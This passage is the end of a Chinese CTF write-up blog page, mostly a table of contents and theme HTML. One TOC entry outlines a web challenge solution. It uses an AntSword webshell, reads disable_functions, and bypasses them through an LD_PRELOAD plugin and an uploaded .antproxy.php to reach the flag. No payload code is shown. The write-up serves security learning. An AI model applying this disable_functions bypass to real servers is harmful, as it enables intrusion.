9%A1%B5%E9%9D%A2%EF%BC%8C%E5%90%91%E4%B8%8B%E7%BF%BB%E6%89%BE%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%EF%BC%9Adisable-functions-pcntl-alarm-pcntl-fork-pentl-waitpid-pentl-wait-pentl-wifexited-pentl-wifstopped-pcntl-wifsignaled-ini-set-pcntl-wifcontinued-pcntl-wexitstatus-pcntl-w-%E5%BE%88%E6%98%8E%E6%98%BE%E5%87%BD%E6%95%B0%E9%83%BD%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E5%B7%AE%E4%B8%8D%E5%A4%9A%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%E4%B8%8B%E4%B8%80%E4%B8%AA%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87-%E5%8F%B3%E9%94%AE%E8%BF%9E%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%AF%A5%E7%BB%95%E8%BF%87%E6%8F%92%E4%BB%B6%EF%BC%8C%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E9%80%89%E6%8B%A9LD-Preload-%E4%BB%80%E4%B9%88%E6%98%AFLD-PRELOAD-%E6%90%9C%E7%B4%A2%E8%B5%84%E6%96%99%E5%BE%97%E7%9F%A5%EF%BC%8C%E8%AF%A5%E5%8F%98%E9%87%8F%E4%B8%BALinux%E7%B3%BB%E7%BB%9F%E5%9C%A8%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E8%BF%9E%E6%8E%A5%E5%BA%93%E6%97%B6%E6%9C%80%E5%85%88%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%8F%98%E9%87%8F%EF%BC%8C%E6%8B%A5%E6%9C%89%E6%9C%80%E9%AB%98%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%8C%E7%8C%9C%E6%B5%8B%E8%BF%99%E9%87%8C%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%80%E7%82%B9%E7%BB%95%E8%BF%87-%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87-%E7%BB%95%E8%BF%87%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E4%BA%86%E4%B8%80%E4%B8%AA-antProxy-php%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E7%BF%BB%E8%AF%91%E5%B0%B1%E6%98%AF%E8%9A%81%E5%89%91%E7%9A%84%E4%BB%A3%E7%90%86%EF%BC%8C%E6%AD%A4%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%86%8D%E6%AC%A1%E6%96%B0%E5%BB%BA%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%A2%98%E7%9B%AE%E8%BF%9E%E6%8E%A5-antproxy-php%EF%BC%8C%E5%AF%86%E7%A0%81%E8%BF%98%E6%98%AF%E4%B8%80%E5%8F%A5%E8%AF%9D%E9%A9%AC%E4%B8%AD%E9%82%A3%E4%B8%AA%E5%AF%86%E7%A0%81-%E7%BB%95%E8%BF%87%E6%88%90%E5%8A%9F-%E7%BF%BB%E9%98%85%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%BE%97%E5%88%B0flag"><span class="toc-number">3.</span> <span class="toc-text">我们使用中国蚁剑连接该马  - 连接成功  - 访问根目录，访问失败，这是怎么回事？  - 看wp，得知在此处设置了disablefunction函数，导致我们不能访问根目录，那么我们怎么访问phpinfo和怎么绕过disablefunction函数？      - 打开中国蚁剑，挂上代理访问插件市场      - 下载插件phpinfo和绕过disablefunction      - 打开连接列表，右键题目连接，加载插件，首先我们加载PHPinfo插件          - 打开页面，向下翻找可以看到：disable_functions:pcntl alarm.pcntl fork,pentl waitpid,pentl wait pentl wifexited.pentl wifstopped,pcntl wifsignaled,ini set,pcntl_wifcontinued.pcntl_wexitstatus.pcntl_w.......      - 很明显函数都被禁用的差不多了，所以我们使用下一个插件进行绕过          - 右键连接加载该绕过插件，绕过方式选择LD_Preload          - 什么是LD_PRELOAD              - 搜索资料得知，该变量为Linux系统在加载动态连接库时最先加载的变量，拥有最高优先级，猜测这里利用这一点绕过          - 执行绕过          - 绕过成功后，我们看到蚁剑上传了一个.antProxy.php的文件，翻译就是蚁剑的代理，此时，我们再次新建连接，使用题目连接+&#x2F;.antproxy.php，密码还是一句话马中那个密码      - 绕过成功  - 翻阅根目录，得到flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shell"><span class="toc-number">3.0.1.</span> <span class="toc-text">shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E"><span class="toc-number">3.0.2.</span> <span class="toc-text">秋名山车神</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD"><span class="toc-number">3.0.3.</span> <span class="toc-text">闪电十六鞭</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">3.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">1和0的故事</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%8F%96%E8%AF%811"><span class="toc-number">3.1.2.</span> <span class="toc-text">简单取证1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E5%86%99"><span class="toc-number">3.1.3.</span> <span class="toc-text">隐写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E5%86%992"><span class="toc-number">3.1.4.</span> <span class="toc-text">隐写2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%88%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%EF%BC%8C%E8%BF%98%E5%8D%95%E7%BA%AF%E5%90%97"><span class="toc-number">3.1.5.</span> <span class="toc-text">又一张图片，还单纯吗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#talnet"><span class="toc-number">3.1.6.</span> <span class="toc-text">talnet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%BC%E8%A7%81%E9%9D%9E%E5%AE%9E"><span class="toc-number">3.1.7.</span> <span class="toc-text">眼见非实</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%95%8A%E5%93%92"><span class="toc-number">3.1.8.</span> <span class="toc-text">啊哒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ping"><span class="toc-number">3.1.9.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B"><span class="toc-number">3.1.10.</span> <span class="toc-text">赛博朋克</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%9D%E6%96%AF%E6%89%8B"><span class="toc-number">3.1.11.</span> <span class="toc-text">贝斯手</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#blind-injection"><span class="toc-number">3.1.12.</span> <span class="toc-text">blind_injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%B8%A6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.13.</span> <span class="toc-text">宽带信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">3.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x2F"><span class="toc-number">3.2.1.</span> <span class="toc-text">&#x2F;.-</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84%E5%B0%8F%E7%BE%8A"><span class="toc-number">3.2.2.</span> <span class="toc-text">聪明的小羊</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ok-x2F-lt-gt"><span class="toc-number">3.2.3.</span> <span class="toc-text">ok&#x2F; [+-&lt;&gt;]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Show"><span class="toc-number">4.</span> <span class="toc-text">CTF Show</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">4.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web6"><span class="toc-number">4.1.1.</span> <span class="toc-text">web6</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/" title="蓝初面试"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝初面试"/></a><div class="content"><a class="title" href="/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/" title="蓝初面试">蓝初面试</a><time datetime="2023-06-23T01:55:00.000Z" title="发表于 2023-06-23 09:55:00">2023-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/05/0108%20xhcms-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="xhcms-报错注入审计"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xhcms-报错注入审计"/></a><div class="content"><a class="title" href="/2023/05/05/0108%20xhcms-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="xhcms-报错注入审计">xhcms-报错注入审计</a><time datetime="2023-05-05T07:00:00.000Z" title="发表于 2023-05-05 15:00:00">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/04/sqlmap%E4%BD%BF%E7%94%A8/" title="sqlmap使用"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/SQL_Injection.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlmap使用"/></a><div class="content"><a class="title" href="/2023/05/04/sqlmap%E4%BD%BF%E7%94%A8/" title="sqlmap使用">sqlmap使用</a><time datetime="2023-05-04T15:51:00.000Z" title="发表于 2023-05-04 23:51:00">2023-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/04/zzcms-cookie%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="zzcms-cookie注入审计"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="zzcms-cookie注入审计"/></a><div class="content"><a class="title" href="/2023/05/04/zzcms-cookie%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="zzcms-cookie注入审计">zzcms-cookie注入审计</a><time datetime="2023-05-04T15:17:00.000Z" title="发表于 2023-05-04 23:17:00">2023-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/29/0106%20CTF%20Show-Web%E5%85%A5%E9%97%A8/" title="CTF Show-Web入门"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF Show-Web入门"/></a><div class="content"><a class="title" href="/2023/04/29/0106%20CTF%20Show-Web%E5%85%A5%E9%97%A8/" title="CTF Show-Web入门">CTF Show-Web入门</a><time datetime="2023-04-29T08:36:00.000Z" title="发表于 2023-04-29 16:36:00">2023-04-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By zha0fe1</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><div class="aplayer no-destroy" data-id="7839668682" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" data-volume="0.5" muted></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="野鹤,纷飞,日暮,不思归" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>